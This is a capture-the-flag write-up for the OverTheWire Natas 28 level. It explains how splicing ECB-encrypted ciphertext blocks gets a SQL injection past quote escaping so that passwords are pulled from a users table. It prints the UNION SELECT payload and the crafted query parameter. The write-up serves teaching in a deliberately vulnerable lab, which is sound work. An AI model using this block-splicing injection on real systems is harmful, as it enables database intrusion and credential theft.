# OverTheWire Natas 27 - 28 

**Objective**

The goal of Natas 28 is to retrieve the password from the `users` table by exploiting the way the application encrypts the SQL query parameter.

- The important vulnerability is the use of `ECB mode encryption`, which allows us to manipulate encrypted blocks without knowing the encryption key.

### Understanding the Search Parameter

When searching for something simple such as:

`hello`

- the application does not put `hello` directly into the URL.

- Instead, the `query` parameter contains an encrypted value, for example:

```
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKI2nqdSIqg8bRBxCLXlTEXrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ/Ons=
```

The value is <Base64 encoded ciphertext>.

There are therefore two steps involved:

- URL decoding

- Base64 decoding

The Base64-decoded result is encrypted binary data, so it is not expected to be readable.

### Identifying the ECB Block Size

The encryption uses a block size of `16 bytes`.

ECB encrypts each block independently:

*Plaintext:*

[ Block 1 ][ Block 2 ][ Block 3 ][ Block 4 ]

     ↓          ↓          ↓          ↓

Ciphertext:

[   C1   ][   C2   ][   C3   ][   C4   ]


- This is important because we can take encrypted blocks from one ciphertext and rearrange or replace them without knowing the encryption key.

### Why Padding Is Required

- A normal SQL injection such as:

```
' UNION SELECT ALL password FROM users; -- 
```

does not work directly because the application escapes the quote.

- Therefore, padding is used:

```
AAAAAAAAA' UNION SELECT ALL password FROM users; -- 
```

- The `nine A` characters are important because they align the SQL injection with the encryption blocks.

- The resulting input is encrypted by the application.

### Sending the SQL Injection

I submitted:

```
AAAAAAAAA' UNION SELECT ALL password FROM users; -- 
```

The application returned this encrypted query:

```
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5l+76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutG****************************************/Ons=
```

- First, I URL-decoded the value.

- Then I divided the ciphertext into its 16-byte blocks.

### Removing the Header and Bad Block

- The first three blocks contained the header and the block containing the escaped quote.

- Following the block-alignment technique, I removed those blocks.

The remaining ciphertext was:

```
+76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutG****************************************/Ons=
```

- The important idea here is that I am `not decrypting the ciphertext`.

- Instead, I am manipulating complete encrypted blocks.

### Adding the Header and Dummy Block

- The walkthrough provides a known header:

```
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP
```

- and a dummy encrypted block:

```
ItlMM3qTizkRB5P2zYxJsb
```

These are placed before the SQL-injection blocks.

- The trailer is then appended at the end:

```
c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
```

Conceptually, the final ciphertext becomes:

[Header]
[Dummy block]
[SQL injection blocks]
[Trailer]


This works because ECB encrypts each block independently.

### Reconstructing the Ciphertext

The combined Base64 value was:

```
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP
ItlMM3qTizkRB5P2zYxJsb
+76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutGkE7dxkKLuB1QrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ/Ons=
c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
```

Because manipulating the Base64 strings directly can be confusing, I decoded each section separately in `CyberChef`.

- For each section I used:

From Base64
    ↓
To Hex


- I configured the Hex output so that the bytes were displayed in 16-byte lines.

- This makes the ECB blocks much easier to see and manipulate.

### Re-encoding the Modified Ciphertext

After combining the required blocks, I converted the resulting hexadecimal data back into Base64.

The final Base64 value was then URL encoded.

The resulting `query` parameter was:

```
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsb%2B76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutGkE7dxkKLuB1QrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOntzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D
```

I placed this value in the `query` parameter of search.php.
Result: <natas29_password>


*Tools Used*

- Browser

- CyberChef

- URL Decode

- From Base64

- To Hex

- From Hex

- Base64 encoding

*Vulnerability*

ECB block manipulation / ciphertext block splicing combined with SQL injection.